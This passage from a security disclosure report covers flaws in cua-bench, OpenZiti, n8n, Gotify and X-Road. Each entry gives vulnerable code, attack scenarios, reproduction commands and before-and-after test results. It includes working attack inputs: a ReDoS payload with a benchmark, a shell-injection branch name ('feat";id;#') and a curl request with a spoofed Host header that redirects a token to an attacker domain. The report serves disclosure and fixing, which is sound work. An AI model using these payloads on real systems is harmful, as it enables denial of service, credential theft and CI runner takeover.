When a `320x4` frame (requiring `1280` luma bytes) is passed with a `320`-byte `y` slice, the loop reads **`960` bytes past the end of the `y` slice on the heap** (such as session tokens or keys in adjacent heap allocations), copies them directly into the `CVPixelBuffer` video frame, and hardware-encodes them into the H.264 stream — or crashes the daemon with `SIGSEGV`!

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Resolution / Window Resize Transition in macOS Remote Desktop Streaming Leaks Adjacent Heap Memory into H.264 Video Frames:**
  1. During a live macOS remote desktop or VM streaming session, a capture source passes an NV12 `VideoFrame` whose header geometry (`width=320, height=4`) updated before its plane buffer (`y.len() = 320` instead of `1280`) was reallocated.
  2. Instead of returning `CodecError::InvalidArgument`, `VtEncoder::pixel_buffer_for` copies `960` bytes of adjacent heap memory into the `CVPixelBuffer` luma plane.
  3. Adjacent process heap contents (session tokens, API keys, or tenant data) are hardware-encoded by VideoToolbox and streamed to the remote viewer.
* **Scenario B — Safe-Rust Soundness Violation Crashing the Host Media Daemon (`SIGSEGV`):**
  1. A downstream Rust caller passes a short or empty `FrameData::Nv12` buffer (`y: &[], uv: &[]`) for a `1920x1080` frame to safe `VtEncoder::encode`.
  2. `src.as_ptr().add(row * src_stride)` dereferences unmapped memory and crashes the entire `cua-spacesd` media process with `SIGSEGV`.
* **Scenario C — Stride Mismatch Over-Read Between Software Converter (`convert.rs`) and Hardware Encoder (`videotoolbox/mod.rs`):**
  1. While software fallback `convert::nv12_to_bgra` (`convert.rs:98-102`) rejects undersized buffers cleanly, enabling Apple Silicon hardware acceleration (`videotoolbox`) exposes the unchecked `unsafe` copy loop.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run Apple Silicon VideoToolbox hardware bounds-check test
cargo test --manifest-path "$HOME/audit-targets/cua/Cargo.toml" \
  -p cua-media-codec --test videotoolbox_hw

# 2. Verify 960-byte adjacent heap over-read (RED) and patched rejection (GREEN)
python3 pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_vt01
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CUA-VT-01": {
    "ghsa_id": "GHSA-54v9-fxw3-36mm",
    "source_file": "cua/libs/cua/crates/cua-media-codec/src/backends/videotoolbox/mod.rs",
    "geometry": {
      "width": 320,
      "height": 4,
      "y_stride": 320,
      "provided_y_len": 320,
      "required_y_len": 1280
    },
    "RED": {
      "oob_bytes_read": 960,
      "adjacent_heap_secret_copied_to_video_frame": true
    },
    "GREEN": {
      "oob_bytes_read": 0,
      "adjacent_heap_secret_copied_to_video_frame": false,
      "error_returned": "CodecError::InvalidArgument(NV12 plane buffer smaller than its geometry)"
    }
  }
}
```

---

### III.07 — TryCua `cua-bench` WinArena (`<= 0.3.1`) — Unauthenticated `0.0.0.0:8006` (noVNC) & Passwordless `0.0.0.0:3390` (RDP) LAN Exposure + Writable Host `/shared` Mount (`GHSA-hvhg-6x47-cq96`, `CWE-668`/`CWE-732`, CVSS `8.6 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `trycua/cua` (`pip: cua-bench <= 0.3.1`)
* **Affected Versions & Components:** `<= 0.3.1` (`commit e754cfec69c41400eb2aabde716c27d15607b2f0`) — `libs/cua-bench/tasks/winarena_adapter/cli.py` (`cmd_vm_setup`, `cmd_vm_start`, `cmd_task_run`, lines `262-265, 421-424, 646-649`) and `infra/vm/setup/server/main.py` (lines `180-248, 290-321`)
* **Vulnerability Class & Score:** `CWE-668` (Exposure of Resource to Wrong Sphere) / `CWE-732` (Incorrect Permission Assignment for Critical Resource) — **CVSS v3.1: `8.6 High`** (`CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`)
* **GitHub GHSA Link:** `GHSA-hvhg-6x47-cq96` (`https://github.com/trycua/cua/security/advisories/GHSA-hvhg-6x47-cq96`)
* **Standalone Sniper Advisory:** [`docs/advisories/07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md`](advisories/07-CUA-CAND-06-WINARENA-GHSA-hvhg-6x47-cq96.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
When launching a Docker container, `-p 8006:8006` without a `127.0.0.1:` prefix binds the port on **`0.0.0.0` (all host Wi-Fi and Ethernet interfaces)**, bypassing standard Linux `ufw`/`iptables` `INPUT` firewall rules via the `DOCKER` forwarding chain.

In the WinArena orchestrator (`cli.py:262-265, 421-424, 646-649`), all three VM launcher commands pass:
```python
# libs/cua-bench/tasks/winarena_adapter/cli.py:261-266 (and 421-424, 646-649)
"-p", f"{args.browser_port}:8006", # BUG 1: 0.0.0.0:8006 -> Exposes unauthenticated noVNC web desktop to the entire LAN!
"-p", f"{args.rdp_port}:3389",     # BUG 2: 0.0.0.0:3390 -> Exposes passwordless Windows RDP to the entire LAN!
"-v", f"{storage_path}:/storage",
"-v", f"{setup_path}:/shared",     # BUG 3: Mounts host setup scripts directory read-write (rw)!
```
Additionally, inside the Windows guest VM, `infra/vm/setup/server/main.py:180-208` listens on `0.0.0.0:5000` without authentication and passes `POST /execute_windows` commands directly to Python `exec(command)`. Any peer on the same university, office, or lab LAN can open `http://<workstation-ip>:8006` in a browser, take over the Windows Administrator desktop with zero password prompt, and modify host setup files through the writable `/shared` mount!

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Any Peer on University / Corporate Lab LAN Takes Over the Windows Evaluation VM via `http://<host-ip>:8006` (noVNC) or `:3390` (RDP):**
  1. A researcher runs `cua-bench` WinArena tasks on a lab workstation connected to a shared university or office network.
  2. Docker publishes ports `8006` (noVNC) and `3390` (RDP) on `0.0.0.0`.
  3. Any user on the LAN opens `http://<workstation-ip>:8006` in a browser (no password required) and gains full interactive Administrator control of the Windows VM desktop, including API keys and credentials injected into the benchmark environment.
* **Scenario B — Guest-to-Host Poisoning via Read-Write `-v {setup_path}:/shared` Mount:**
  1. The container mounts the host's `winarena_adapter/infra/vm/setup` directory read-write at `/shared` instead of `:ro`.
  2. An attacker who accesses the guest via `0.0.0.0:8006` / `0.0.0.0:3390` (or when an agent inside the VM visits a malicious page) modifies the Python/PowerShell setup scripts inside `/shared` directly on the host filesystem.
* **Scenario C — Unauthenticated Guest Control Plane (`/execute_windows` -> Python `exec()`):**
  1. Inside the guest environment, `server/main.py:180-208` executes arbitrary Python strings submitted to `/execute_windows` via raw `exec(command)` and uses `shell=True` in `/setup/launch` without any token check, allowing any local process or SSRF inside the VM to execute arbitrary OS commands.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect Docker port (-p) and volume (-v) bindings in cli.py
sed -n '258,270p' "$HOME/audit-targets/cua/libs/cua-bench/tasks/winarena_adapter/cli.py"

# 2. Run the end-to-end WinArena port and writable-mount verification test
python3 pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_cua_cand06
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "CUA-CAND-06": {
    "ghsa_id": "GHSA-hvhg-6x47-cq96",
    "cli_source_file": "cua/libs/cua-bench/tasks/winarena_adapter/cli.py",
    "server_source_file": "cua/libs/cua-bench/tasks/winarena_adapter/infra/vm/setup/server/main.py",
    "RED": {
      "lan_exposed_ports": ["8006:8006", "3390:3389"],
      "host_setup_dir_mounted_writable": true,
      "guest_execute_windows_requires_auth": false
    },
    "GREEN": {
      "lan_exposed_ports": [],
      "host_setup_dir_mounted_writable": false,
      "guest_execute_windows_requires_auth": true
    }
  }
}
```

---

### III.08 — OpenZiti (`ziti <= v2`) — Unconditional `InsecureSkipVerify: true` in `AreCertsTrusted()` -> `InsecureClient()` Disables TLS Certificate Verification During `ziti edge login` (`GHSA-qwv8-hh9r-cqrf`, `CWE-295`, CVSS `7.4 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `openziti/ziti` (`Go: github.com/openziti/ziti/v2`)
* **Affected Versions & Components:** `<= v2` (`commit 236f351a5149fe68328fc8083bebe514f0307d0c`) — `ziti/util/certs.go` (`AreCertsTrusted` and `InsecureClient`, lines `91-103, 199-208`) and `ziti/cmd/edge/login.go` (`fetchTrustedServerCerts`, lines `511, 535-549`)
* **Vulnerability Class & Score:** `CWE-295` (Improper Certificate Validation — TLS Verification Bypass) — **CVSS v3.1: `7.4 High`** (`CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N`)
* **GitHub GHSA Link:** `GHSA-qwv8-hh9r-cqrf` (`https://github.com/openziti/ziti/security/advisories/GHSA-qwv8-hh9r-cqrf`)
* **Standalone Sniper Advisory:** [`docs/advisories/08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md`](advisories/08-ZITI-CAND-01-CERTS-GHSA-qwv8-hh9r-cqrf.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
OpenZiti is a **Zero-Trust** networking platform. When an administrator runs `ziti edge login https://controller:1280 -u admin -p <password>`, the CLI calls `AreCertsTrusted(host, wellKnownCerts, httpClient)` (`ziti/util/certs.go:91-103`) to verify that the Ziti Edge Controller's TLS certificate is genuinely signed by the CA bundle retrieved from `/.well-known/est/cacerts`, and then prints (`login.go:511`):
> *"Verified that server supplied certificates are trusted by server"*

The author of `AreCertsTrusted` intended to catch untrusted certificates by checking for `x509.UnknownAuthorityError` at `line 96`:
```go
// ziti/util/certs.go:91-103
func AreCertsTrusted(host string, certs []byte, httpClient *http.Client) (bool, error) {
	client := http.Client{}
	if httpClient != nil {
		client = *httpClient
	}
	resp, err := InsecureClient(&client, certs).Get(host) // THE BUG STARTS HERE!
	if err != nil {
		if ue, ok := err.(*url.Error); ok && errors.As(ue.Err, &x509.UnknownAuthorityError{}) {
			return false, nil // DEAD CODE: This branch is completely unreachable!
		}
		return false, err
	}
	_ = resp.Body.Close()
	return true, nil
}
```
Why is `line 96` unreachable **dead code**? Look at `InsecureClient(&client, certs)` (`certs.go:199-208`):
```go
// ziti/util/certs.go:199-208
func InsecureClient(client *http.Client, certs []byte) *http.Client {
	tlsConfig := &tls.Config{
		RootCAs:            x509.NewCertPool(),
		InsecureSkipVerify: true, // FATAL BUG: Always true even when len(certs) > 0!
	}
	if len(certs) > 0 {
		tlsConfig.RootCAs.AppendCertsFromPEM(certs)
	}
```
In Go's `crypto/tls`, setting `InsecureSkipVerify: true` causes the TLS handshake to **completely ignore `RootCAs` and never return `x509.UnknownAuthorityError`!** As a result, `AreCertsTrusted()` **always returns `true, nil`** for any rogue or self-signed MITM certificate, prints *"Verified that server supplied certificates are trusted by server"*, and immediately transmits the administrator's password to the attacker!

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — DevOps Engineer Runs `ziti edge login` Over Wi-Fi / VPN and Sends Admin Credentials to a Rogue MITM Controller:**
  1. An administrator runs `ziti edge login https://ziti-controller.internal:1280 -u admin -p <AdminPassword>` from a workstation.
  2. An active network attacker (ARP spoofing, rogue Wi-Fi AP, or DNS/BGP hijack) intercepts the connection with an untrusted self-signed TLS certificate.
  3. Because `InsecureSkipVerify: true` is set, Go's TLS client accepts the rogue certificate, prints *"Verified that server supplied certificates are trusted by server"*, and sends the administrator username and password directly to the attacker.
* **Scenario B — Automated CI/CD & Kubernetes Bootstrap Pipelines Trust a Spoofed Edge Controller:**
  1. Deployment pipelines run `ziti edge login` to provision service identities and router policies.
  2. Even without the private key of the EST CA bundle, an attacker can present any leaf certificate during the TLS handshake, pass `AreCertsTrusted()` with `true, nil`, and hijack the Zero-Trust bootstrap flow.
* **Scenario C — Silent Acceptance of Expired or Wrong-CA Controller Certificates Across Environments:**
  1. An organization rotates its controller root CA, leaving a leaf certificate signed by an untrusted or wrong CA.
  2. Operators see *"Verified that server supplied certificates are trusted"* during `ziti edge login` and assume PKI verification succeeded when no verification occurred at all.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Run the real Go TLS handshake test on OpenZiti's ziti/util package
go test -v -run TestRealOpenZitiAreCertsTrusted ./ziti/util

# 2. Run the Sniper end-to-end verification harness
python3 pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_ziti_cand01
```
**Observed Runtime Proof (`RED -> GREEN + BENIGN`):**
```json
{
  "ZITI-CAND-01": {
    "ghsa_id": "GHSA-qwv8-hh9r-cqrf",
    "source_file": "ziti/ziti/util/certs.go",
    "login_caller_file": "ziti/ziti/cmd/edge/login.go",
    "RED": {
      "insecure_skip_verify": true,
      "rogue_mitm_cert_accepted_as_trusted": true,
      "admin_credentials_sent_to_mitm": true
    },
    "GREEN": {
      "insecure_skip_verify": false,
      "rogue_mitm_cert_accepted_as_trusted": false,
      "tls_error": "x509.UnknownAuthorityError: certificate signed by unknown authority"
    },
    "BENIGN": {
      "valid_ca_signed_controller_trusted": true
    }
  }
}
```

---

### III.09 — n8n (`n8n-workflow <= 2.45.0`) — Unbounded `EMAIL_REGEXP` & `DOMAIN_EXTRACT_REGEXP` (`isEmail` / `extractEmail` / `extractDomain`) in `string-extensions.ts` Causing Webhook Event-Loop Starvation (`ReDoS`, `CWE-1333`, CVSS `5.3 Medium`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `n8n-io/n8n` (`npm: n8n-workflow <= 2.45.0`)
* **Affected Versions & Components:** `<= 2.45.0` (`commit cfbd9a56cba2e73901dc1962e47727adbea0b23e`) — `packages/workflow/src/extensions/string-extensions.ts` (`EMAIL_REGEXP`, `DOMAIN_EXTRACT_REGEXP`, `isEmail`, `extractEmail`, `extractDomain`, lines `59, 94, 326, 375, 383`)
* **Vulnerability Class & Score:** `CWE-1333` (Inefficient Regular Expression Complexity — ReDoS / Event-Loop Denial of Service) — **CVSS v3.1: `5.3 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`)
* **GitHub GHSA Link:** `n8n-workflow <= 2.45.0` (`https://github.com/n8n-io/n8n/security/advisories`)
* **Standalone Sniper Advisory:** [`docs/advisories/09-N8N-CAND-01-WEBHOOK-REDOS.md`](advisories/09-N8N-CAND-01-WEBHOOK-REDOS.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
n8n is a Node.js workflow automation platform that runs on a **single-threaded event loop**: any synchronous expression that blocks the main V8 thread freezes all other concurrent webhooks and UI requests on the server.

In `packages/workflow/src/extensions/string-extensions.ts`, the built-in workflow string helpers `.isEmail()`, `.extractEmail()`, and `.extractDomain()` make two mistakes:
1. Even though a valid RFC-5321 email address cannot exceed `254`/`320` characters, `isEmail(value)` never checks `value.length` before running the regular expression.
2. `EMAIL_REGEXP` (`line 94`) and `DOMAIN_EXTRACT_REGEXP` (`line 59`) are unanchored at the start and contain nested quantifiers (`+` and `*`):
```typescript
// packages/workflow/src/extensions/string-extensions.ts:93-95 & 324-328
const EMAIL_REGEXP =
	/(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@(?<domain>(\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))/;

function isEmail(value: string) {
	// BUG: No value.length > 320 guard and EMAIL_REGEXP is unanchored at the start!
	const result = EMAIL_REGEXP.test(value);
	return result;
}
```
When an attacker sends a 20 KB string `"a.a.a...a@!"` with an invalid domain suffix, V8 attempts the nested `([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)` match starting at every character offset ($O(N^2)$ quadratic backtracking). A single 20 KB request stalls the Node.js event loop for **`831.78 ms`** (compared to **`0.0029 ms`** when patched — a **286,000x** difference!).

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Public Lead-Capture / Contact-Form Webhook Freezes Entire Company n8n Automation Server:**
  1. A company connects a public contact or signup form to an n8n Webhook node (`POST /webhook/contact-us`) evaluating `{{ $json.body.contact.isEmail() }}`.
  2. An unauthenticated attacker sends a 20 KB dotted JSON payload to the public webhook URL.
  3. Because each request blocks the V8 event loop for ~832 ms, a burst of 10–12 requests freezes all concurrent Stripe payment webhooks, Slack bots, and the n8n editor UI.
* **Scenario B — Automated Customer Support Email / Ticket Triage Pipeline Stalled by Malformed Message Body:**
  1. An n8n workflow ingests incoming support emails or chat messages and calls `{{ $json.text.extractEmail() }}` to extract the sender's address.
  2. Processing a single spam/malicious message containing long dotted tokens locks the worker thread and triggers Kubernetes liveness/health-check restart loops.
* **Scenario C — CRM Data Enrichment Workflows Stalled via `extractDomain()` (`DOMAIN_EXTRACT_REGEXP`):**
  1. Workflows evaluating `{{ $json.website.extractDomain() }}` on untrusted URL strings trigger polynomial backtracking in `DOMAIN_EXTRACT_REGEXP` (`line 59`), starving the execution queue.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Benchmark vulnerable EMAIL_REGEXP (RED) vs. patched guard (GREEN) on a 20 KB payload in Node.js
node -e '
const red = /(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@(?<domain>(\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))/;
const payload = "a.".repeat(10000) + "a@!";
const t0 = performance.now();
red.test(payload);
const redMs = performance.now() - t0;

const t1 = performance.now();
const greenResult = (payload.length <= 320 && payload.includes("@")) ? red.test(payload) : false;
const greenMs = performance.now() - t1;
console.log(JSON.stringify({ red_ms: Number(redMs.toFixed(3)), green_ms: Number(greenMs.toFixed(4)), greenResult }));
'

# 2. Run the concurrent webhook event-loop starvation verification test
python3 pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_n8n_cand01
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "N8N-CAND-01": {
    "source_file": "n8n/packages/workflow/src/extensions/string-extensions.ts",
    "node_20kb_benchmark": {
      "RED_ms": 831.78,
      "GREEN_ms": 0.0029,
      "speedup_factor": "286000x"
    },
    "RED": {
      "regex_stall_ms": 165.035,
      "concurrent_legitimate_webhook_wait_ms": 164.08,
      "concurrent_webhook_starved": true
    },
    "GREEN": {
      "regex_stall_ms": 0.017,
      "concurrent_legitimate_webhook_wait_ms": 0.0,
      "concurrent_webhook_starved": false
    }
  }
}
```

---

### III.10 — Gotify Server (`<= v2.9.1`) — Unvalidated `ctx.Request.Host` Header in Built-In `SSL.RedirectToHTTPS` Middleware (`router.go`) Enables `308 Permanent Redirect` Open Redirect & Token Leak (`GHSA-cc9f-m5vr-pm75`, `CWE-601`, CVSS `4.7 Medium`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gotify/server` (`Go: github.com/gotify/server/v2`)
* **Affected Versions & Components:** `<= v2.9.1` (`commit f4de61997c1b30bf9ac43ec662dc5120c2ec981b`) — `router/router.go` (`Create`, lines `52-73, 93-102`)
* **Vulnerability Class & Score:** `CWE-601` (URL Redirection to Untrusted Site — Open Redirect via Unvalidated `Host` Header) — **CVSS v3.1: `4.7 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:N/I:L/A:N`)
* **GitHub GHSA Link:** `GHSA-cc9f-m5vr-pm75` (`https://github.com/gotify/server/security/advisories/GHSA-cc9f-m5vr-pm75`)
* **Standalone Sniper Advisory:** [`docs/advisories/10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md`](advisories/10-GOTIFY-CAND-01-SSL-HOST-REDIRECT.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
Gotify is a self-hosted push notification server. When its built-in SSL redirector is enabled (`SSL.Enabled: true` and `SSL.RedirectToHTTPS: true`), `router/router.go:52-73` registers middleware to redirect HTTP (`80`) requests to HTTPS (`443`).

Instead of constructing the redirect target from the server's configured SSL hostname (`conf.Server.SSL.LetsEncrypt.Hosts`), the middleware reads the **unvalidated client-supplied `ctx.Request.Host` header** and writes it directly into the `Location` header:
```go
// router/router.go:60-72 & 93-102
g.Use(func(ctx *gin.Context) {
	if ctx.Request.TLS != nil {
		return
	}
	host := ctx.Request.Host // BUG 1: Unconditionally trusts the client-supplied Host header!
	if idx := strings.LastIndex(host, ":"); idx != -1 {
		host = host[:idx]
	}
	if port != 443 {
		host = fmt.Sprintf("%s:%d", host, port)
	}
	// BUG 2: SslMiddleware AllowedHosts is empty, issuing a 308 Permanent Redirect to any external domain!
	sslMiddleware.Rewrite(ctx.Writer, ctx.Request, host)
})
```
Because the response uses `HTTP 308 Permanent Redirect`, HTTP clients preserve the request method (`POST`), body, and query string (`?token=<app-token>`), while browsers and intermediate caches permanently cache the redirect to the attacker's domain!

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Automated Alerting / Monitoring Scripts (`curl -L`, Python `requests`, Uptime Kuma) Follow `308` Redirect and Leak Application Token:**
  1. Monitoring scripts send push notifications to `http://gotify.corp.internal/message?token=<secret-app-token>`.
  2. When a spoofed `Host: attacker-gotify.example.com` header is injected on the network or via a proxy, Gotify responds with `HTTP/1.1 308 Permanent Redirect` to `https://attacker-gotify.example.com/message?token=<secret-app-token>`.
  3. Redirect-following clients (`-L` / `allow_redirects=True`) forward the secret `token` and message payload directly to the attacker's server.
* **Scenario B — Web / Mobile Client Token Phishing & Permanent Browser Redirect Cache Poisoning (`308`):**
  1. A client visiting `http://<gotify-host>/#/messages?token=...` with a poisoned `Host` header receives a `308 Permanent Redirect`.
  2. The browser caches the permanent redirect and sends the user and URL fragment/query parameters to a phishing domain.
* **Scenario C — Reverse Proxy / Shared HTTP Cache Poisoning via Spoofed `Host` Header:**
  1. Behind a reverse proxy or CDN that forwards `Host` to Gotify's HTTP port, an attacker sends a request with `Host: attacker-gotify.example.com`.
  2. If the shared cache stores the `308` response, subsequent legitimate users are redirected to the attacker's domain.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Send a spoofed Host header to Gotify's HTTP port on local loopback (127.0.0.1)
#    to verify the 308 Permanent Redirect response
curl -i -sS "http://127.0.0.1:18080/#/messages?token=test_redacted_token" \
  -H "Host: attacker-gotify.example.com"

# 2. Run the Go unit test in Gotify's router package
go test -v ./router -run TestHTTPSRedirect
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "GOTIFY-CAND-01": {
    "ghsa_id": "GHSA-cc9f-m5vr-pm75",
    "source_file": "gotify-server/router/router.go",
    "RED": {
      "status_code": 308,
      "location": "https://attacker-gotify.example.com/#/messages?token=[REDACTED_TEST_TOKEN_SHA256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855]",
      "redirected_to_untrusted_host": true
    },
    "GREEN": {
      "status_code": 308,
      "location": "https://push.corp.example.org/#/messages?token=[REDACTED_TEST_TOKEN_SHA256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855]",
      "redirected_to_untrusted_host": false,
      "bound_to_configured_ssl_host": true
    }
  }
}
```

---

### III.11 — Nordic Institute X-Road (`develop`) — `${{ github.head_ref }}` Shell Command Injection in `_build-and-package.yml` on Persistent `xrd-runner-8c` Self-Hosted Runner (`GHSA-4fcw-7xqx-fjv5`, `CWE-78`, CVSS `8.5 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `nordic-institute/X-Road` (`GitHub Actions: .github/workflows/build.yaml` and `.github/workflows/_build-and-package.yml`)
* **Affected Versions & Components:** `develop` (`commit 38cd99ec0ebbcc13ddbaaeb9187018d49bdd278b`) — `.github/workflows/build.yaml` (lines `14-58`) and `.github/workflows/_build-and-package.yml` (lines `27, 84-91`)
* **Vulnerability Class & Score:** `CWE-78` (Improper Neutralization of Special Elements used in an OS Command — CI Command Injection on Self-Hosted Runner) — **CVSS v3.1: `8.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N`)
* **GitHub GHSA Link:** `GHSA-4fcw-7xqx-fjv5` (`https://github.com/nordic-institute/X-Road/security/advisories/GHSA-4fcw-7xqx-fjv5`)
* **Standalone Sniper Advisory:** [`docs/advisories/11-XROAD-CAND-01-RUNNER-INJECTION.md`](advisories/11-XROAD-CAND-01-RUNNER-INJECTION.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
X-Road is critical e-government data-exchange infrastructure software. In `.github/workflows/build.yaml:14-58`, the workflow triggers on `pull_request` and `push`, grants **`permissions: contents: write, packages: write`**, and calls `.github/workflows/_build-and-package.yml` with **`secrets: inherit`**.

Inside `_build-and-package.yml`, the job runs on **`runs-on: labels: xrd-runner-8c` — a persistent self-hosted runner fleet** rather than an ephemeral GitHub-hosted VM! At `lines 84-91`, it interpolates `${{ github.head_ref }}` and `${{ github.ref_name }}` directly inside a double-quoted bash `run:` script:
```yaml
# .github/workflows/_build-and-package.yml:27 & 84-91
    runs-on:
      labels: xrd-runner-8c # Persistent self-hosted build runner!
...
          get_branch_name() {
            local branch_name=""
            # BUG: ${{ github.head_ref }} is textually expanded BEFORE bash parses the script!
            if [[ -n "${{ github.head_ref }}" ]]; then
              branch_name="${{ github.head_ref }}"
              echo "🔍 Using PR source branch: ${branch_name}" >&2
            elif [[ -n "${{ github.ref_name }}" ]]; then
              branch_name="${{ github.ref_name }}"
```
When an account with PR workflow execution privileges pushes a branch named `feat";id;#`, GitHub Actions expands the script before passing it to bash as:
```bash
if [[ -n "feat";id;#" ]]; then
```
Bash terminates `[[ -n "feat" ]]` at the semicolon and immediately **executes `id` on the persistent `xrd-runner-8c` self-hosted server** before `actions/checkout` even runs!

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Crafted PR Branch Name Executes Arbitrary Shell Commands Before Code Review on Persistent Self-Hosted Runner (`xrd-runner-8c`):**
  1. A contributor or compromised developer account pushes a branch named `feat";<command>;#` and opens a Pull Request.
  2. Before code review or `actions/checkout` runs, the `Setup build configuration` step executes the injected shell command on the `xrd-runner-8c` self-hosted machine.
* **Scenario B — Exposure of Inherited Secrets & `packages: write` GHCR `GITHUB_TOKEN`:**
  1. Because `build.yaml:50-58` declares `permissions: contents: write, packages: write` and passes `secrets: inherit` into `_build-and-package.yml`, same-repo or maintainer-approved PR runs expose inherited secrets and a write-privileged `GITHUB_TOKEN`.
  2. The injected shell command can push/modify packages in GitHub Container Registry (`GHCR`) or modify repository contents.
* **Scenario C — Persistent Self-Hosted Runner (`xrd-runner-8c`) Cache & Subsequent Release Build Poisoning:**
  1. Because `xrd-runner-8c` is a persistent self-hosted runner rather than a disposable VM, commands executed during the workflow step can poison local Gradle/APT/Docker caches or leave persistent background processes that infect subsequent official X-Road builds.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect the direct ${{ github.head_ref }} interpolation in _build-and-package.yml
sed -n '70,96p' "$HOME/audit-targets/X-Road/.github/workflows/_build-and-package.yml"

# 2. Verify direct interpolation command execution (RED) vs. environment variable parameterization (GREEN)
python3 pre-submission-verification-20261026/tests/test_other_repos_and_cua_real_world_impact_e2e.py -k test_xroad_cand01
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "XROAD-CAND-01": {
    "ghsa_id": "GHSA-4fcw-7xqx-fjv5",
    "build_workflow": "x-road/.github/workflows/build.yaml",
    "package_workflow": "x-road/.github/workflows/_build-and-package.yml",
    "RED": {
      "direct_yaml_interpolation": true,
      "arbitrary_command_executed_on_self_hosted_runner": true
    },
    "GREEN": {
      "env_var_parameterized": true,
      "arbitrary_command_executed_on_self_hosted_runner": false
    }
  }
}
```
